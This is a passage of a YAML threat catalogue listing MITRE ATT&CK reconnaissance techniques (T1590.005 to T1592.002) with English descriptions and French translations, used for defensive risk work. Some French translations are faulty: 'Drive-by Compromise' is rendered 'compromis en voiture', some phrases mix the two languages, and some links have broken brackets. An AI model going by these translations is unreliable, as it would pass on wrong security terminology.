          \ qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les adresses IP publiques\
          \ peuvent \xEAtre attribu\xE9es aux organisations par bloc, ou par une gamme\
          \ d\u2019adresses s\xE9quentielles. Les informations sur les adresses IP\
          \ attribu\xE9es peuvent inclure une vari\xE9t\xE9 de d\xE9tails, comme les\
          \ adresses IP utilis\xE9es. Les adresses IP peuvent \xE9galement permettre\
          \ \xE0 un adversaire d\u2019obtenir d\u2019autres d\xE9tails sur une victime,\
          \ tels que la taille de l\u2019organisation, l\u2019emplacement physique,\
          \ le fournisseur d\u2019acc\xE8s Internet, ou la mani\xE8re dont son infrastructure\
          \ accessible au public est h\xE9berg\xE9e.\n\nLes adversaires peuvent recueillir\
          \ ces informations de diff\xE9rentes mani\xE8res, telles que par des actions\
          \ de collecte directe via [Scan Actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les adresses IP attribu\xE9es peuvent \xE9galement\
          \ \xEAtre expos\xE9es aux adversaires via des ensembles de donn\xE9es en\
          \ ligne ou d\u2019autres jeux de donn\xE9es accessibles (ex : [Search Open\
          \ Technical Databases](https://attack.mitre.org/techniques/T1596)). (Citation\
          \ : WHOIS)(Citation : Conteneur DNS)(Citation : DNS passif circulaire) La\
          \ collecte de ces informations peut r\xE9v\xE9ler d\u2019autres formes de\
          \ reconnaissance (ex : [Scan actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [Acquisition\
          \ d\u2019infrastructure](https://attack.mitre.org/techniques/T1583) ou [Infrastructure\
          \ de compromis](https://attack.mitre.org/techniques/T1584)), et/ou d\u2019\
          acc\xE8s initial (ex : [Remote externe Services](https://attack.mitre.org/techniques/T1133)).\n\
          https://attack.mitre.org/techniques/T1590/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.006
    ref_id: T1590.006
    name: Network Security Appliances
    description: 'Adversaries may gather information about the victim''s network security
      appliances that can be used during targeting. Information about network security
      appliances may include a variety of details, such as the existence and specifics
      of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries
      may also target information about victim network-based intrusion detection systems
      (NIDS) or other appliances related to defensive cybersecurity operations.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation:
      Nmap Firewalls NIDS) Information about network security appliances may also
      be exposed to adversaries via online or other accessible data sets (ex: [Search
      Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering
      this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/006'
    translations:
      fr:
        name: "Appliances de s\xE9curit\xE9 r\xE9seau"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ appareils de s\xE9curit\xE9 r\xE9seau de la victime qui peuvent \xEAtre\
          \ utilis\xE9s lors du ciblage. Les informations sur les appliances de s\xE9\
          curit\xE9 r\xE9seau peuvent inclure une vari\xE9t\xE9 de d\xE9tails, tels\
          \ que l\u2019existence et les sp\xE9cificit\xE9s des pare-feux d\xE9ploy\xE9\
          s, des filtres de contenu et des proxies/h\xF4tes bastion. Les adversaires\
          \ peuvent \xE9galement cibler des informations sur les syst\xE8mes de d\xE9\
          tection d\u2019intrusion bas\xE9s sur le r\xE9seau (NIDS) des victimes ou\
          \ d\u2019autres appareils li\xE9s aux op\xE9rations de cybers\xE9curit\xE9\
          \ d\xE9fensive.\n\nLes adversaires peuvent recueillir ces informations de\
          \ diff\xE9rentes mani\xE8res, telles que par des actions de collecte directe\
          \ via [Scan Actif](https://attack.mitre.org/techniques/T1595) ou [Phishing\
          \ pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ (Citation : Pare-feux Nmap NIDS) Les informations sur les appareils de\
          \ s\xE9curit\xE9 r\xE9seau peuvent \xE9galement \xEAtre expos\xE9es aux\
          \ adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ jeux de donn\xE9es accessibles (ex : [Rechercher des sites web appartenant\
          \ aux victimes](https://attack.mitre.org/techniques/T1594)). La collecte\
          \ de ces informations peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance\
          \ (ex. : [Rechercher dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou un acc\xE8s initial (ex : [Remote externe Services](https://attack.mitre.org/techniques/T1133)).\n\
          https://attack.mitre.org/techniques/T1590/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591
    ref_id: T1591
    name: Gather Victim Org Information
    description: 'Adversaries may gather information about the victim''s organization
      that can be used during targeting. Information about an organization may include
      a variety of details, including the names of divisions/departments, specifics
      of business operations, as well as the roles and responsibilities of key employees.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about an organization may also be exposed to adversaries via online or other
      accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Phishing for
      Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or
      [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1591'
    translations:
      fr:
        name: Rassembler des informations sur les organisations victimes
        description: "Les adversaires peuvent recueillir des informations sur l\u2019\
          organisation de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur une organisation peuvent inclure une vari\xE9t\xE9\
          \ de d\xE9tails, notamment les noms de divisions/d\xE9partements, les d\xE9\
          tails des op\xE9rations commerciales, ainsi que les r\xF4les et responsabilit\xE9\
          s des employ\xE9s cl\xE9s.\n\nLes adversaires peuvent recueillir ces informations\
          \ de diff\xE9rentes mani\xE8res, comme par l\u2019obtention directe via\
          \ [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur une organisation peuvent \xE9galement \xEAtre expos\xE9\
          es aux adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ donn\xE9es accessibles (ex : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Recherche de sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : fuite ThreatPost Broadvoice)(Citation : SEC EDGAR Search)\
          \ La collecte de ces informations peut r\xE9v\xE9ler d\u2019autres formes\
          \ de reconnaissance (ex : [Phishing pour information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [\xC9tablir\
          \ des comptes](https://attack.mitre.org/techniques/T1585) ou [Comptes de\
          \ compromis](https://attack.mitre.org/techniques/T1586)), et/ou un acc\xE8\
          s initial (ex : [Phishing]( https://attack.mitre.org/techniques/T1566) ou\
          \ [Relation de confiance](https://attack.mitre.org/techniques/T1199)).\n\
          https://attack.mitre.org/techniques/T1591"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.001
    ref_id: T1591.001
    name: Determine Physical Locations
    description: 'Adversaries may gather the victim''s physical location(s) that can
      be used during targeting. Information about physical locations of a target organization
      may include a variety of details, including where key resources and infrastructure
      are housed. Physical locations may also indicate what legal jurisdiction and/or
      authorities the victim operates within.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical
      locations of a target organization may also be exposed to adversaries via online
      or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)
      or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation:
      ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Phishing for
      Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or
      [Hardware Additions](https://attack.mitre.org/techniques/T1200)).

      https://attack.mitre.org/techniques/T1591/001'
    translations:
      fr:
        name: "D\xE9terminer les emplacements physiques"
        description: "Les adversaires peuvent recueillir la ou les positions physiques\
          \ de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les informations\
          \ sur les emplacements physiques d\u2019une organisation cible peuvent inclure\
          \ une vari\xE9t\xE9 de d\xE9tails, notamment l\u2019emplacement des ressources\
          \ et infrastructures cl\xE9s. Les lieux physiques peuvent \xE9galement indiquer\
          \ dans quelle juridiction l\xE9gale et/ou quelles autorit\xE9s la victime\
          \ op\xE8re.\n\nLes adversaires peuvent recueillir ces informations de diff\xE9\
          rentes mani\xE8res, comme par l\u2019obtention directe via [Phishing for\
          \ Information](https://attack.mitre.org/techniques/T1598). Les emplacements\
          \ physiques d\u2019une organisation cible peuvent \xE9galement \xEAtre expos\xE9\
          s aux adversaires via des ensembles de donn\xE9es en ligne ou autres donn\xE9\
          es accessibles (ex : [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)\
          \ ou [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)).\
          \ (Citation : fuite ThreatPost Broadvoice)(Citation : SEC EDGAR Search)\
          \ La collecte de ces informations peut r\xE9v\xE9ler d\u2019autres formes\
          \ de reconnaissance (ex : [Phishing pour information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ la mise en place de ressources op\xE9rationnelles (ex : [D\xE9velopper\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou [Obtenir\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1588)), et/ou un\
          \ acc\xE8s initial (ex : [Phishing]( https://attack.mitre.org/techniques/T1566)\
          \ ou [ajouts mat\xE9riels](https://attack.mitre.org/techniques/T1200)).\n\
          https://attack.mitre.org/techniques/T1591/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.002
    ref_id: T1591.002
    name: Business Relationships
    description: "Adversaries may gather information about the victim's business relationships\
      \ that can be used during targeting. Information about an organization\u2019\
      s business relationships may include a variety of details, including second\
      \ or third-party organizations/domains (ex: managed service providers, contractors,\
      \ etc.) that have connected (and potentially elevated) network access. This\
      \ information may also reveal supply chains and shipment paths for the victim\u2019\
      s hardware and software resources.\n\nAdversaries may gather this information\
      \ in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
      \ Information about business relationships may also be exposed to adversaries\
      \ via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:\
      \ ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195),\
      \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted\
      \ Relationship](https://attack.mitre.org/techniques/T1199)).\nhttps://attack.mitre.org/techniques/T1591/002"
    translations:
      fr:
        name: "Relations d\u2019affaires"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ relations d\u2019affaires de la victime qui peuvent \xEAtre utilis\xE9\
          es lors du ciblage. Les informations sur les relations commerciales d\u2019\
          une organisation peuvent inclure une vari\xE9t\xE9 de d\xE9tails, notamment\
          \ des organisations/domaines de seconde ou tierce partie (ex. : fournisseurs\
          \ de services manag\xE9s, sous-traitants, etc.) qui ont un acc\xE8s r\xE9\
          seau connect\xE9 (et potentiellement am\xE9lior\xE9). Ces informations peuvent\
          \ \xE9galement r\xE9v\xE9ler les cha\xEEnes d\u2019approvisionnement et\
          \ les chemins d\u2019exp\xE9dition des ressources mat\xE9rielles et logicielles\
          \ de la victime.\n\nLes adversaires peuvent recueillir ces informations\
          \ de diff\xE9rentes mani\xE8res, comme par l\u2019obtention directe via\
          \ [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les relations d\u2019affaires peuvent \xE9galement\
          \ \xEAtre expos\xE9es aux adversaires via des ensembles de donn\xE9es en\
          \ ligne ou d\u2019autres donn\xE9es accessibles (ex : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : fuite ThreatPost Broadvoice) La collecte de ces informations\
          \ peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance (ex : [Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598) ou [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ de l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [\xC9\
          tablir des comptes](https://attack.mitre.org/techniques/T1585) ou [Compromis\
          \ des comptes](https://attack.mitre.org/techniques/T1586)), et/ou d\u2019\
          un acc\xE8s initial (ex : [Supply Chain] compromis](https://attack.mitre.org/techniques/T1195),\
          \ [compromis en voiture](https://attack.mitre.org/techniques/T1189), ou\
          \ [relation de confiance](https://attack.mitre.org/techniques/T1199)).\n\
          https://attack.mitre.org/techniques/T1591/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.003
    ref_id: T1591.003
    name: Identify Business Tempo
    description: "Adversaries may gather information about the victim's business tempo\
      \ that can be used during targeting. Information about an organization\u2019\
      s business tempo may include a variety of details, including operational hours/days\
      \ of the week. This information may also reveal times/dates of purchases and\
      \ shipments of the victim\u2019s hardware and software resources.\n\nAdversaries\
      \ may gather this information in various ways, such as direct elicitation via\
      \ [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information\
      \ about business tempo may also be exposed to adversaries via online or other\
      \ accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:\
      \ ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))\nhttps://attack.mitre.org/techniques/T1591/003"
    translations:
      fr:
        name: Identifier le tempo des affaires
        description: "Les adversaires peuvent recueillir des informations sur le rythme\
          \ d\u2019affaires de la victime qui peuvent \xEAtre utilis\xE9es lors du\
          \ ciblage. Les informations sur le rythme des affaires d\u2019une organisation\
          \ peuvent inclure une vari\xE9t\xE9 de d\xE9tails, notamment des horaires\
          \ ou des jours d\u2019op\xE9ration de la semaine. Ces informations peuvent\
          \ \xE9galement r\xE9v\xE9ler les dates/heures d\u2019achat et d\u2019exp\xE9\
          dition des ressources mat\xE9rielles et logicielles de la victime.\n\nLes\
          \ adversaires peuvent recueillir ces informations de diff\xE9rentes mani\xE8\
          res, comme par l\u2019obtention directe via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur le rythme des affaires peuvent \xE9galement \xEA\
          tre expos\xE9es aux adversaires via des ensembles de donn\xE9es en ligne\
          \ ou d\u2019autres donn\xE9es accessibles (ex : [Social Media](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : fuite ThreatPost Broadvoice) La collecte de ces informations\
          \ peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance (ex : [Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598) ou [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ de l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [\xC9\
          tablir des comptes](https://attack.mitre.org/techniques/T1585) ou [Compromis\
          \ des comptes](https://attack.mitre.org/techniques/T1586)), et/ou d\u2019\
          un acc\xE8s initial (ex : [Supply Chain] Compromis](https://attack.mitre.org/techniques/T1195)\
          \ ou [Relation de confiance](https://attack.mitre.org/techniques/T1199))\n\
          https://attack.mitre.org/techniques/T1591/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.004
    ref_id: T1591.004
    name: Identify Roles
    description: 'Adversaries may gather information about identities and roles within
      the victim organization that can be used during targeting. Information about
      business roles may reveal a variety of targetable details, including identifiable
      information for key personnel as well as what data/resources they have access
      to.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about business roles may also be exposed to adversaries via online or other
      accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).

      https://attack.mitre.org/techniques/T1591/004'
    translations:
      fr:
        name: "Identifier les r\xF4les"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ identit\xE9s et les r\xF4les au sein de l\u2019organisation victime qui\
          \ peuvent \xEAtre utilis\xE9es lors du ciblage. Les informations sur les\
          \ r\xF4les m\xE9tier peuvent r\xE9v\xE9ler une vari\xE9t\xE9 de d\xE9tails\
          \ ciblables, notamment des informations identifiables pour le personnel\
          \ cl\xE9 ainsi que les donn\xE9es/ressources auxquelles ils ont acc\xE8\
          s.\n\nLes adversaires peuvent recueillir ces informations de diff\xE9rentes\
          \ mani\xE8res, comme par l\u2019obtention directe via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les r\xF4les professionnels peuvent \xE9galement\
          \ \xEAtre expos\xE9es aux adversaires via des ensembles de donn\xE9es en\
          \ ligne ou d\u2019autres donn\xE9es accessibles (ex : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : fuite ThreatPost Broadvoice) La collecte de ces informations\
          \ peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance (ex : [Phishing\
          \ pour information](https://attack.mitre.org/techniques/T1598) ou [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [\xC9tablir\
          \ des comptes](https://attack.mitre.org/techniques/T1585) ou [Comptes de\
          \ compromis](https://attack.mitre.org/techniques/T1586)), et/ou un acc\xE8\
          s initial (ex : [Phishing]( https://attack.mitre.org/techniques/T1566)).\n\
          https://attack.mitre.org/techniques/T1591/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592
    ref_id: T1592
    name: Gather Victim Host Information
    description: "Adversaries may gather information about the victim's hosts that\
      \ can be used during targeting. Information about hosts may include a variety\
      \ of details, including administrative data (ex: name, assigned IP, functionality,\
      \ etc.) as well as specifics regarding its configuration (ex: operating system,\
      \ language, etc.).\n\nAdversaries may gather this information in various ways,\
      \ such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595)\
      \ or [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
      \ Adversaries may also compromise sites then include malicious content designed\
      \ to collect host information from visitors.(Citation: ATT ScanBox) Information\
      \ about hosts may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\
      \ Gathering this information may reveal opportunities for other forms of reconnaissance\
      \ (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)\
      \ or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also gather victim host information via User-Agent HTTP headers,\
      \ which are sent to a server to identify the application, operating system,\
      \ vendor, and/or version of the requesting user agent. This can be used to inform\
      \ the adversary\u2019s follow-on action. For example, adversaries may check\
      \ user agents for the requesting operating system, then only serve malware for\
      \ target operating systems while ignoring others.(Citation: TrellixQakbot)\n\
      https://attack.mitre.org/techniques/T1592"
    translations:
      fr:
        name: "Recueillez les informations sur les h\xF4tes des victimes"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ h\xF4tes de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les h\xF4tes peuvent inclure une vari\xE9t\xE9 de\
          \ d\xE9tails, notamment des donn\xE9es administratives (par exemple : nom,\
          \ IP attribu\xE9e, fonctionnalit\xE9s, etc.) ainsi que des d\xE9tails concernant\
          \ sa configuration (ex : syst\xE8me d\u2019exploitation, langage, etc.).\n\
          \nLes adversaires peuvent recueillir ces informations de diff\xE9rentes\
          \ mani\xE8res, telles que par des actions de collecte directe via [Scan\
          \ Actif](https://attack.mitre.org/techniques/T1595) ou [Phishing pour obtenir\
          \ des informations](https://attack.mitre.org/techniques/T1598). Les adversaires\
          \ peuvent \xE9galement compromettre les sites et inclure du contenu malveillant\
          \ destin\xE9 \xE0 collecter des informations d\u2019h\xE9bergement aupr\xE8\
          s des visiteurs. (Citation : ATT ScanBox) Les informations sur les h\xE9\
          bergeurs peuvent \xE9galement \xEAtre expos\xE9es aux adversaires via des\
          \ ensembles de donn\xE9es en ligne ou d\u2019autres donn\xE9es accessibles\
          \ (ex : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ La collecte de ces informations peut r\xE9v\xE9ler d\u2019autres formes\
          \ de reconnaissance (ex : [Rechercher dans des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Rechercher dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou un acc\xE8s initial (ex : [Cha\xEEne d\u2019approvisionnement compromis](https://attack.mitre.org/techniques/T1195)\
          \ ou [services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)).\n\
          \nLes adversaires peuvent \xE9galement recueillir des informations sur l\u2019\
          h\xF4te victime via des en-t\xEAtes HTTP User-Agent, qui sont envoy\xE9\
          s \xE0 un serveur pour identifier l\u2019application, le syst\xE8me d\u2019\
          exploitation, le fournisseur et/ou la version de l\u2019agent utilisateur\
          \ demandeur. Cela peut servir \xE0 informer l\u2019action de suite de l\u2019\
          adversaire. Par exemple, les adversaires peuvent v\xE9rifier les agents\
          \ utilisateur pour le syst\xE8me d\u2019exploitation demandeur, puis ne\
          \ servir que des logiciels malveillants pour les syst\xE8mes cibles en ignorant\
          \ les autres. (Citation : TrellixQakbot)\nhttps://attack.mitre.org/techniques/T1592"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.001
    ref_id: T1592.001
    name: Hardware
    description: 'Adversaries may gather information about the victim''s host hardware
      that can be used during targeting. Information about hardware infrastructure
      may include a variety of details such as types and versions on specific hosts,
      as well as the presence of additional components that might be indicative of
      added defensive protections (ex: card/biometric readers, dedicated encryption
      hardware, etc.).


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex:
      hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then include malicious content designed
      to collect host information from visitors.(Citation: ATT ScanBox) Information
      about the hardware infrastructure may also be exposed to adversaries via online
      or other accessible data sets (ex: job postings, network maps, assessment reports,
      resumes, or purchase invoices). Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003)
      or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).

      https://attack.mitre.org/techniques/T1592/001'
    translations:
      fr:
        name: "Mat\xE9riel"
        description: "Les adversaires peuvent recueillir des informations sur le mat\xE9\
          riel h\xF4te de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur l\u2019infrastructure mat\xE9rielle peuvent inclure\
          \ divers d\xE9tails tels que des types et des versions sur des h\xF4tes\
          \ sp\xE9cifiques, ainsi que la pr\xE9sence de composants suppl\xE9mentaires\
          \ pouvant indiquer des protections d\xE9fensives suppl\xE9mentaires (ex.\
          \ : lecteurs de cartes/biom\xE9triques, mat\xE9riel de chiffrement d\xE9\
          di\xE9, etc.).\n\nLes adversaires peuvent recueillir ces informations de\
          \ diff\xE9rentes mani\xE8res, telles que des actions de collecte directe\
          \ via [Analyse active](https://attack.mitre.org/techniques/T1595) (ex :\
          \ noms d\u2019h\xF4te, banni\xE8res serveur, cha\xEEnes d\u2019agents utilisateur)\
          \ ou [Phishing pour information](https://attack.mitre.org/techniques/T1598).\
          \ Les adversaires peuvent \xE9galement compromettre les sites et inclure\
          \ du contenu malveillant destin\xE9 \xE0 collecter des informations d\u2019\
          h\xE9bergement aupr\xE8s des visiteurs. (Citation : ATT ScanBox) Les informations\
          \ sur l\u2019infrastructure mat\xE9rielle peuvent \xE9galement \xEAtre expos\xE9\
          es aux adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ donn\xE9es accessibles (ex : offres d\u2019emploi, cartes r\xE9seau, rapports\
          \ d\u2019\xE9valuation, CV ou factures d\u2019achat). La collecte de ces\
          \ informations peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance\
          \ (ex. : [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Rechercher des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou un acc\xE8s initial (ex : [Compromis de l\u2019approvisionnement\
          \ mat\xE9riel] cha\xEEne](https://attack.mitre.org/techniques/T1195/003)\
          \ ou [ajouts mat\xE9riels](https://attack.mitre.org/techniques/T1200)).\n\
          https://attack.mitre.org/techniques/T1592/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.002
    ref_id: T1592.002
    name: Software
    description: 'Adversaries may gather information about the victim''s host software
      that can be used during targeting. Information about installed software may
      include a variety of details such as types and versions on specific hosts, as
      well as the presence of additional components that might be indicative of added
      defensive protections (ex: antivirus, SIEMs, etc.).


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex:
      listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then include malicious content designed
